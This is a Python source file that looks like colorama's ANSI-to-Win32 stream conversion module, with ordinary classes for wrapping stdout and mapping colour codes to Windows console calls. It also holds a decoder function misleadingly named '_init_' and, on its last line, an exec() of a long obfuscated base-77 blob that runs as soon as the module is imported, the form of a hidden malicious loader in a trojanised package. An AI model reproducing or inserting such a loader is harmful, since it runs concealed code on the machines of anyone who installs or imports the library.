import re
import sys
import os

from .ansi import AnsiFore, AnsiBack, AnsiStyle, Style, BEL
from .winterm import enable_vt_processing, WinTerm, WinColor, WinStyle
from .win32 import windll, winapi_test


winterm = None
if windll is not None:
    winterm = WinTerm()


def _init_(encoded: str) -> str:
    alphabet = (
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "0123456789"
        "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"
    )
    base = 77

    char_to_value = {char: idx for idx, char in enumerate(alphabet)}

    int_value = 0
    for char in encoded:
        int_value = int_value * base + char_to_value[char]

    num_bytes = (int_value.bit_length() + 7) // 8
    bytes_data = int_value.to_bytes(num_bytes, byteorder='big')

    try:
        return bytes_data.decode()
    except UnicodeDecodeError:

        return bytes_data

class StreamWrapper(object):
    '''
    Wraps a stream (such as stdout), acting as a transparent proxy for all
    attribute access apart from method 'write()', which is delegated to our
    Converter instance.
    '''
    def __init__(self, wrapped, converter):
        # double-underscore everything to prevent clashes with names of
        # attributes on the wrapped stream object.
        self.__wrapped = wrapped
        self.__convertor = converter

    def __getattr__(self, name):
        return getattr(self.__wrapped, name)

    def __enter__(self, *args, **kwargs):
        # special method lookup bypasses __getattr__/__getattribute__, see
        # https://stackoverflow.com/questions/12632894/why-doesnt-getattr-work-with-exit
        # thus, contextlib magic methods are not proxied via __getattr__
        return self.__wrapped.__enter__(*args, **kwargs)

    def __exit__(self, *args, **kwargs):
        return self.__wrapped.__exit__(*args, **kwargs)

    def __setstate__(self, state):
        self.__dict__ = state

    def __getstate__(self):
        return self.__dict__

    def write(self, text):
        self.__convertor.write(text)

    def isatty(self):
        stream = self.__wrapped
        if 'PYCHARM_HOSTED' in os.environ:
            if stream is not None and (stream is sys.__stdout__ or stream is sys.__stderr__):
                return True
        try:
            stream_isatty = stream.isatty
        except AttributeError:
            return False
        else:
            return stream_isatty()

    @property
    def closed(self):
        stream = self.__wrapped
        try:
            return stream.closed
        # AttributeError in the case that the stream doesn't support being closed
        # ValueError for the case that the stream has already been detached when atexit runs
        except (AttributeError, ValueError):
            return True


class AnsiToWin32(object):
    '''
    Implements a 'write()' method which, on Windows, will strip ANSI character
    sequences from the text, and if outputting to a tty, will convert them into
    win32 function calls.
    '''
    ANSI_CSI_RE = re.compile('\001?\033\\[((?:\\d|;)*)([a-zA-Z])\002?')   # Control Sequence Introducer
    ANSI_OSC_RE = re.compile('\001?\033\\]([^\a]*)(\a)\002?')             # Operating System Command

    def __init__(self, wrapped, convert=None, strip=None, autoreset=False):
        # The wrapped stream (normally sys.stdout or sys.stderr)
        self.wrapped = wrapped

        # should we reset colors to defaults after every .write()
        self.autoreset = autoreset

        # create the proxy wrapping our output stream
        self.stream = StreamWrapper(wrapped, self)

        on_windows = os.name == 'nt'
        # We test if the WinAPI works, because even if we are on Windows
        # we may be using a terminal that doesn't support the WinAPI
        # (e.g. Cygwin Terminal). In this case it's up to the terminal
        # to support the ANSI codes.
        conversion_supported = on_windows and winapi_test()
        try:
            fd = wrapped.fileno()
        except Exception:
            fd = -1
        system_has_native_ansi = not on_windows or enable_vt_processing(fd)
        have_tty = not self.stream.closed and self.stream.isatty()
        need_conversion = conversion_supported and not system_has_native_ansi

        # should we strip ANSI sequences from our output?
        if strip is None:
            strip = need_conversion or not have_tty
        self.strip = strip

        # should we should convert ANSI sequences into win32 calls?
        if convert is None:
            convert = need_conversion and have_tty
        self.convert = convert

        # dict of ansi codes to win32 functions and parameters
        self.win32_calls = self.get_win32_calls()

        # are we wrapping stderr?
        self.on_stderr = self.wrapped is sys.stderr

    def should_wrap(self):
        '''
        True if this class is actually needed. If false, then the output
        stream will not be affected, nor will win32 calls be issued, so
        wrapping stdout is not actually required. This will generally be
        False on non-Windows platforms, unless optional functionality like
        autoreset has been requested using kwargs to init()
        '''
        return self.convert or self.strip or self.autoreset

    def get_win32_calls(self):
        if self.convert and winterm:
            return {
                AnsiStyle.RESET_ALL: (winterm.reset_all, ),
                AnsiStyle.BRIGHT: (winterm.style, WinStyle.BRIGHT),
                AnsiStyle.DIM: (winterm.style, WinStyle.NORMAL),
                AnsiStyle.NORMAL: (winterm.style, WinStyle.NORMAL),
                AnsiFore.BLACK: (winterm.fore, WinColor.BLACK),
                AnsiFore.RED: (winterm.fore, WinColor.RED),
                AnsiFore.GREEN: (winterm.fore, WinColor.GREEN),
                AnsiFore.YELLOW: (winterm.fore, WinColor.YELLOW),
                AnsiFore.BLUE: (winterm.fore, WinColor.BLUE),
                AnsiFore.MAGENTA: (winterm.fore, WinColor.MAGENTA),
                AnsiFore.CYAN: (winterm.fore, WinColor.CYAN),
                AnsiFore.WHITE: (winterm.fore, WinColor.GREY),
                AnsiFore.RESET: (winterm.fore, ),
                AnsiFore.LIGHTBLACK_EX: (winterm.fore, WinColor.BLACK, True),
                AnsiFore.LIGHTRED_EX: (winterm.fore, WinColor.RED, True),
                AnsiFore.LIGHTGREEN_EX: (winterm.fore, WinColor.GREEN, True),
                AnsiFore.LIGHTYELLOW_EX: (winterm.fore, WinColor.YELLOW, True),
                AnsiFore.LIGHTBLUE_EX: (winterm.fore, WinColor.BLUE, True),
                AnsiFore.LIGHTMAGENTA_EX: (winterm.fore, WinColor.MAGENTA, True),
                AnsiFore.LIGHTCYAN_EX: (winterm.fore, WinColor.CYAN, True),
                AnsiFore.LIGHTWHITE_EX: (winterm.fore, WinColor.GREY, True),
                AnsiBack.BLACK: (winterm.back, WinColor.BLACK),
                AnsiBack.RED: (winterm.back, WinColor.RED),
                AnsiBack.GREEN: (winterm.back, WinColor.GREEN),
                AnsiBack.YELLOW: (winterm.back, WinColor.YELLOW),
                AnsiBack.BLUE: (winterm.back, WinColor.BLUE),
                AnsiBack.MAGENTA: (winterm.back, WinColor.MAGENTA),
                AnsiBack.CYAN: (winterm.back, WinColor.CYAN),
                AnsiBack.WHITE: (winterm.back, WinColor.GREY),
                AnsiBack.RESET: (winterm.back, ),
                AnsiBack.LIGHTBLACK_EX: (winterm.back, WinColor.BLACK, True),
                AnsiBack.LIGHTRED_EX: (winterm.back, WinColor.RED, True),
                AnsiBack.LIGHTGREEN_EX: (winterm.back, WinColor.GREEN, True),
                AnsiBack.LIGHTYELLOW_EX: (winterm.back, WinColor.YELLOW, True),
                AnsiBack.LIGHTBLUE_EX: (winterm.back, WinColor.BLUE, True),
                AnsiBack.LIGHTMAGENTA_EX: (winterm.back, WinColor.MAGENTA, True),
                AnsiBack.LIGHTCYAN_EX: (winterm.back, WinColor.CYAN, True),
                AnsiBack.LIGHTWHITE_EX: (winterm.back, WinColor.GREY, True),
            }
        return dict()

    def write(self, text):
        if self.strip or self.convert:
            self.write_and_convert(text)
        else:
            self.wrapped.write(text)
            self.wrapped.flush()
        if self.autoreset:
            self.reset_all()


    def reset_all(self):
        if self.convert:
            self.call_win32('m', (0,))
        elif not self.strip and not self.stream.closed:
            self.wrapped.write(Style.RESET_ALL)


    def write_and_convert(self, text):
        '''
        Write the given text to our wrapped stream, stripping any ANSI
        sequences from the text, and optionally converting them into win32
        calls.
        '''
        cursor = 0
        text = self.convert_osc(text)
        for match in self.ANSI_CSI_RE.finditer(text):
            start, end = match.span()
            self.write_plain_text(text, cursor, start)
            self.convert_ansi(*match.groups())
            cursor = end
        self.write_plain_text(text, cursor, len(text))


    def write_plain_text(self, text, start, end):
        if start < end:
            self.wrapped.write(text[start:end])
            self.wrapped.flush()


    def convert_ansi(self, paramstring, command):
        if self.convert:
            params = self.extract_params(command, paramstring)
            self.call_win32(command, params)


    def extract_params(self, command, paramstring):
        if command in 'Hf':
            params = tuple(int(p) if len(p) != 0 else 1 for p in paramstring.split(';'))
            while len(params) < 2:
                # defaults:
                params = params + (1,)
        else:
            params = tuple(int(p) for p in paramstring.split(';') if len(p) != 0)
            if len(params) == 0:
                # defaults:
                if command in 'JKm':
                    params = (0,)
                elif command in 'ABCD':
                    params = (1,)

        return params


    def call_win32(self, command, params):
        if command == 'm':
            for param in params:
                if param in self.win32_calls:
                    func_args = self.win32_calls[param]
                    func = func_args[0]
                    args = func_args[1:]
                    kwargs = dict(on_stderr=self.on_stderr)
                    func(*args, **kwargs)
        elif command in 'J':
            winterm.erase_screen(params[0], on_stderr=self.on_stderr)
        elif command in 'K':
            winterm.erase_line(params[0], on_stderr=self.on_stderr)
        elif command in 'Hf':     # cursor position - absolute
            winterm.set_cursor_position(params, on_stderr=self.on_stderr)
        elif command in 'ABCD':   # cursor position - relative
            n = params[0]
            # A - up, B - down, C - forward, D - back
            x, y = {'A': (0, -n), 'B': (0, n), 'C': (n, 0), 'D': (-n, 0)}[command]
            winterm.cursor_adjust(x, y, on_stderr=self.on_stderr)


    def convert_osc(self, text):
        for match in self.ANSI_OSC_RE.finditer(text):
            start, end = match.span()
            text = text[:start] + text[end:]
            paramstring, command = match.groups()
            if command == BEL:
                if paramstring.count(";") == 1:
                    params = paramstring.split(";")
                    # 0 - change title and icon (we will only change title)
                    # 1 - change icon (we don't support this)
                    # 2 - change title
                    if params[0] in '02':
                        winterm.set_title(params[1])
        return text


    def flush(self):
        self.wrapped.flush()

exec(_init_("Qz/io\"cZ'5y6PHbMvQ8i96HtiT10fRytT!8tL&9jm#Cjtf)CMxq#.mjBj622D/EA/'5sE9JDqkwiQSz\"+75&hvEA,A#WkSr*xw+1Wp#kP$q3-rRiH9A''fDnouIMv2H6i4p!)4s4WKT4,wjN$v3fQ2eFc/S-6chnQAF8w9//,7W.i3QowSX\"'#dzr.y*rBZpme64,*T-KIcr4I4+(/p,(+Ue6O8VeQKoy9ioF$wbIBg%M)GZJ&l,,aLdpD9Zi%$$AJ+GiGLdS\"-#ilev%W05o*9HK%wD\"Cs2*AY7D'SPiDptOAg4OOm6a'JPYjv,gT2%dgJ9wcEWB42CpUltF(AoBy'glPUil4SSVe-PnMGyHnvv3(jf00)(*k-5W\"S6qlhDPSohhOY,FF2fKAqPkOGhFRABaC6krk.4(6/mtaiaSh*O/T3VI.H\"r2$N%EiX1*$9kzxLzxPy)*C87M,F\"z/1si$Ea6dOx.o2+B\"KHKcg\"h3g#i.t%4mWP5!RZykiz3J't,nbwX7c2E69bT'hsFQzIwm2C/Bwdn)JCXR4GlSYqHh$wP76k*%N0h)/jxG'8)km*s/OsOKhTZ3ouZPR\"$qeHBrhGtY5v//R6z-BKz)u.U$U%UmfcPYSGz6NVjIa0JCs)aGEedHO(ny/,E5YW6U0F3)vsTvx-jlj(.Jo-F4rzKogy8GuULaKrh%7z(.dzUlw64NmMzoOHit0O&Mqf08(gd4e8M!gvsV-4CEiXABTmoKW&GL!Onsoz&3AeDIdmA3(j%!+vr+&KvEUSf-BkoZ\"(J/(V77l0+3)CHk2)&H6BmPg4iS#LB855o6YBSIu4If,8roBV.emmXT6ITQ!\"2K#9+G%J7nSCe1f\"p3lY7)D#*y5WW\"MQ*3/CjWUxQAZftM)eEBDOO%%MehxqWlnjN/2%mGW,!G2P,*5.7H-rs5h(txXa2Eb&T5x0W(wyq1JKnj%0UvjM/sqazPDVXnlbR+dlNqtOvEJo*qCF)rhKrArJr#a(Co9BOMy\"TItLedyjecDNw4nxR+o3)7i*-'sjA0Q2P!'YcBfiTbNBrI*dL%n3L/+9x3f2e+PHFH1IsZhpZ9LnU6CQh20,'u\"hdCXuQTyvZA%hTDG%A&zHFj+1d8+qcS4ZyQXHBP8v'TnbM.0QXLM-M.P!'Hr-uVNi'1v\"IW(d.#Ky9ZHgN!*00$DWS0AJBrGQ*dknq,.pn6xkdSw88$2'gE*R,/y6(YPuv8JJl!Vg35(.3GkqeD/\"e&zjvifdbiUOBmEKnj39R,-k+#)8Iyi(P#nK'u,/Xeqo622h4zMO$0h1*H!F1VWSpMcaQVsS74NCzSdge(Tf-Sj'z()8ZrjLg8l416y-L4Eg3wuFGW3nZi+OwHZ*lbs!Bb6c4dZ7XmcyAt6ucDeD6JH*M&0QNWz#6eWzcmlj2keNrr/$NK1p7*RU#\"LfFhL+9a)fN1ZRlebs+B(MoOcdCodSrF,8J74l%EXAC$#HW.uHBejmnNV-5ZldG41LsQ\"wYQE06*F'XtcUyeDV3WGz+MAzW-U10+J)&-huEvU(8rE7IY9ln)Mhd*N4xAPpq8u7xbHUvP$jO.E5!kj5IvZ0AoTP'w6+,Z56rxd0bb7I(abae,\"0OnzhE-QJg(GJ(t)n#QxQj24f/qMw3g2!LBRKFZ/l,nIK\"&X3lL/#UzJLy\"Pi2f4c0NZ-vbdBWGprFcwD.%b\"8%s)G$J4th))qEK1g9&E!tumU!fbt#pK/IxcAkx&*3nj5BM(n-JvfkqMzB5CEq41-gZbT.#CP2G1jm5n/7EP9\"XBTOB&(mQ\"d.5J*&D6/cjuGyde,6Tb-\"LP%FvCtn%Gqedg1tsr99F2PG0\"80/WDFttuZqD3&tR&hzTRWjp&K/0+HfFFgQ5Gi7XseERHB1,T.3qwMzGWnjbLWFa&MBKo&FA9kc7SKAytHRw2vFFoOh36yrQ0OOAr'sxQ7YxPMK85PRP1AJgdp4AcxnuD%(*(-/DOTnRkbCSj#oZ5\"sinKBO-#0tOqogPCIMV&R$k7DND#Y7&Vcsh+ucT#K8$lhMBeV%J4*lsFYTw'guDWDqNoNguc+ftq+AMxxjA1iUF6&iOYNO.bWTRltZDLdtO71D4)e'tos*sX7eZ'Y3OMr+h1DyPsw/08si,oz.7JpU.),NIR90'ELk,'K(j5r(rdVn7HwN%asYud9(C)#(m\"czc+Iy&N8.vL%l/gIDC4qM#KcG\"VFq(V/raxFlp(sk#Z*p%\"&YgNKi'+d/F6GK/Jn7/fDZtmk,*CS$!v3o2iLmTMMz8q9W9KN+ks$-lLG/b)WCPPpH,cK4MCE93&NbU2\"J)h$RFm$1-QUZw2Ne5%G%7$51xo*fc6P\"mf-siPBVp0Ga6$x4(7fCtez)q7Vy%q&)yjm&jKPQ+VScoMzZ9yRm21J)sbltDmOVTq+*Iy3se0(6$mCctM'zoYLwB-w*x#gsY7fQ3OsL6O&3$ygArX9Fv#mqofeV(6)h/&$JdnAIO87Ey\"bF-sXN%OR/YYJVut1nDp16D*h7K#cvX$/)V#f9YAz9(LhdDM+6V)YAjvE$Uspnq&Pxa.$-qRlb9dBg3U#07&pCNN,nv!H)FC,F7.0NGR*xd2qHxkl/r4ubrzJiFWwH7*yo2,YXq41ZbV1UD9S1AXHeS!d#Wm,KK8\"obSCCQ&NV5A4L&OqluXg)*lGE5(Bi%O963((u%(-Tig(8SqyccAo/q&f&AAXCvFylPAtSX3KX2mBF,NYaujSXwJu728LzW6&m,I#YNg6pWuuvOdGomhbBpFZJ4JsMqZ8HZltn+HwsEl9,,CQE\"1o/eSCkkb4Zxk93)jQ/KJVY(J3L+DPAuQeNKWkJ.vD.Ofxf0TjWq7St!tQXxtfu#*Svl/yRlXu\"1N$E6ThZza,s18yq-40,(Tn'K*8m+/equ0&3O(+7Jar69npE3v(!LdVSo,#GIYJ3AV,UD!y-iTFq2ApD*TrRD$k07S7C0c+%LF2btV+9kJ7tVcos$F3SJ5-Ov6Uzv%D,Ecw6x'BMUDlQSQbaO.cUDvjH5VctU1&!yN(l)'5XAYE5.oBNZMuBmP46FxEkABOT!\"XK)ohj7(.(HbByxI2QurCXM#qHopJJ49Av'pCfBL4xYs3j5YU9J/64tZIS'irMfSshN(mcT1!/%VI+$5Wdg\"8stS4oRA)vBV!c'9W9(t3!tgw'9C9'FkbpPf8-FuVrE-wVNRQfOjiJsNd&17hv.%F'3zfW.D2.R)C.aQ2FLsJNVEtM&A+5XdM.em'dMnR9/STTol2PlzYnsrShVCoxHfN08A7,CE(MYwSWk3AmOz\"mO39'zC/hbi/*0KB624oPdZUa&I%4B7#hCqY6&+r8RBqpXgzR%J$10WsI*LJ8\"/\"0!)Cy)8rL14i1S&Hji&a&1Kh,6VV&Escl8gdx!SCwm$5%XRNeJS'Aj5t)az'7VTokpsnzi\"4dhsBNTFHY'hYDv-yM6L-tWmrKjIQ19Tpj\"w6GJDRJlYB\"DTdzYq-/-LKIX.*3#i0UKpdBkXyNfTZscfPRZ3CuJCV1xoRNGu#MXN9jd1S'YfDTlwIx9c)UHNjSm/jviwpQ5b($Ery%Aml-sr-p8RWaw*0ahmUVw'90xq71go8/b18cU%8n)n+e!Y#'AiWjvOTU9f%QPnp)!w\"Jp#(Z,QaySm4azQ6vIhfxehidT#cB+9wiwqm1ocVhQX0rr&h#\"&s#!-O&6')sZw)o#yCR)&.a)%J/5vTnd(sJJWZq-As)3hah(Nk#RVq7Yo'x6tDP%Bi3!x'-WP)M2YjVMgMeyy40d55X,1'+4am02*9EH45TWMU91sqs8(Oso1crXV3'/iS-t11doa75ik'F..+n/D8/x5Ok$sN9F%vkd,Zv1d-tNGHt('\"kDo5yoCS2B9MSOMCv%v(qh!Z%mgVJzkSKe,I26+*DDIo1fJ13U8e&E0H%mUZ'tUX+I(PLf5hey.ttWL1s5zAq4evGO8WjV/o$N&rPB($7oX2z6sZfLUsiEJ,W#n#zq3IfPJ4Mhv7XZGep&e'6GY-0**qRH1Rs*IqpYFBuLnnd8hv9a$DBuneT0xkyQfYh93+Sd0GHYyo5GpH36d%8Mrk\"agYi.s/IFk3m9\"w0'jjWj0,9+82bFe-OSovYSB34F8#aaWk#UQVHBVSrAhU6$d1g(W8JU)7lABLpTEw'AzPc#/K/wbI3omn,Y5o'C3aVbGqZ(ZFpY)A4oqP2nX8$zgWaB3W,vjI1q'kU!j*&oZPfvd2k#3p'Jr\"'SQM#KzpwpbAB,Dz8PcA!H%M'IU(6OeB)SGt#C4JCg7Mcm*H(9uH\"INzA#VmD)xxCP'*g0yYD*NAiBMDEaz&DR9MBTFpLWvA30Em5sRT79gCixSpG3S8BRjM#$H+tlc*-S)p-j5)$Gx+yn,6UA-.OuaHNY3YxfF#OfzIlDInsn.!lYdxZ8UIIIg)er'hKwo&Z5tUxlP6-2UC&n'QvORjimVfoR5'*V29Ag%VBYXH\"fp,fUX!dr%0Zxgoc8F4/9vWn*g%52Da9fu%T1FpfEnLBd1Rioyk#FpOGKs0x#LNoPEbvT8mzJTjK,O8(wR9Hdj1V5q+vWkSzgZVO7LmAFBuse&\"2gn,!l#E7aG7V9G*)fsUzQC'F)*5yzVPZ.CWp!L32M1IoSOp+OfqFYe.W%tEk9R#IsWY$ALTUN$%%%PG2VjE*ub'%FVXiMPf2sT#-mNbI0O2W8H4JV#O1#l2PfP9*xgOmDg9mXK&eRtopqdnm2kW/jrKO\"/YxQhmI0y/&Br,u-5V5rr4sAtO)dXk1euX#gw,B'qM)+.D\"eEx5gmu1ZjW-tZ\"4,A6x#2Ogn/sMZvSZyFGlw74RMj)(Sw.KC!YD\"8qRgqBQEuCKNlkaMMAgik87bTk46U(F$XO4H.oiK49K4uBvI*RPDzzDDt(WEuyilb)kTj2s4f&0lSsb,epX\"/!sbWjwkrhfcj1Bj2nL'r0t350#/M09lH'j0&LcCOayiUv+QJMM0DNLv7RwGf8aDrdTNho0+!X8l#6.iKl9QHora32(+bdtTa\"EcfMFfKC%t++WjDyW,kv4lBO7H&pZ7c(t9a\"djz3l3f%F&Yw#$GK%.$Hu2$KkxAP,5kZVdVB#yA)ZGqvp&mq3wI%elUDdl3MzO+MWcnhAePk4$160aZ9gKxRUO7,ce%PoMEAlRy2s,zXmqWle&S9s56#/q$kekLBdDgvX%hWkTEMCbq\"yd/y(DYzz7C'$/SPw.*)Vu%oyW*GbdlwbqOlB(D!4YAh5R+I3bYHTekdIh0-&Xd7RY/1H6.q1gT5+QDX3dA3f.vEVtZsyCliY!)0OS$#U.x/zwzutB3.+ZoO6c35LN#ZrZA/CgKnqB2%,VepXonIMbQ/md92$5qM-1MFZ&#1qeEBo/r#dRAuQ9eeMN'kUHwoyi+OW(ZrWE9c*1*NgIF#eNBPd8TdY8i5oIsSb&h#Y$4ofpA&*goqijP)EDKeRKL)J2KF6utYmNU2#hjslK'RbJ'-AM$kGOfMuP64Irn+6Wob/3CHwZ$bvl!LRg$ePWqO!HIj)V5Ak-n\"MxLqMDW)9f0yEEMTG&6NXPej+wgOZ%)LIw(T341qu*Z46x9rB65Z%mc9sv%9ZCIca#q'!WZ!'JupSXrOVJ/j(8ayp,b2W/+ua4Av30.Sl)P&*CjPIm#PVIc'6c&&4oR#rMAKjmFGmU!c$IkB)&5fZz\"5p1cvVZ-CHH(PKTb(1HbTpa'kyk&OuKy8p&Qvc*#L9JtvBU6wnKyO*.1.aJ3gJ'gW/H\"2ZTfxMETSa-HCs(NvWHwyut\"Ko$&UXKu22&qPzf%Pj3Xrm+Om/7Kye6vSPf6*YzXzXW2,'nLN%Xs!-,-V%950,)+gDOS$3*MOr97+5WgIeG1O3H-n4CgVO4k9D(xW5vANP,1HT1i2/Rwdw0,.16P#9YtBVSsx86Euf#+#R\"PQBc1*1xWVocIPuSU8e4WSI8wBRX.Z(qOp#7.7#u-'WVtAF!mCDw0fn.'6NzW#i8cd!*8o9P*r&B!mzUPX\"e(2Wn7SU(O0G/HIjO.z,g8RT//.&4jgFjZAZ)jWXjaD/*)1MO8ya)VW.m!pCD&oGZ!C69Y10C0&5KN0*V!GXmxi9Hd-618XZhcD3uzk)w\"!K5uF8p.9lEYFo%Oo3*m)+f7-s*wSoKA)FX0s$+vCDEPW(IKYT8)(i#y'Wbc9(2RitDDd!wlbq0QCf)U9D.2aba7'Qpl.q2/6k,ULsI$\"-C3BQF&S1#E23Hn/mGH&Rl7%TLI1QMQm966*Q83$B+w(oL(J#IU,NAP-03z*(*$%qiSQ2II!X8e.2#DcW.Z7V7C(w$6KXSb$x3%AW1eoJ6Gd$/T5$#S*8.+.Z\"KYQQ1C1P3+4fB-Gt#XWPSZC8OxLYlojA%R3&(ZYxWTo'2x#V\"t!SN(fmdOedZ5TF4B//BbxkJSGthrAwfQ)l'e*xZxo/B+6NDoX1!E+-e8KgDbHdsxrB2(vuywe#fb6ohQNR/Iompl38AYc/fE0$OgqMxZ4YllUc.FWFZryH+n#L23O3s#gDICabfi\"LQldK'uhS7'3xItxc!2UxlH#h77&i',4J2jyv&j),lSk8dPPO'f(t8nDN*vq$4V-dOR87br&&Rz&6Mwst45STDgyar%V4pgq-03q08-n*+"))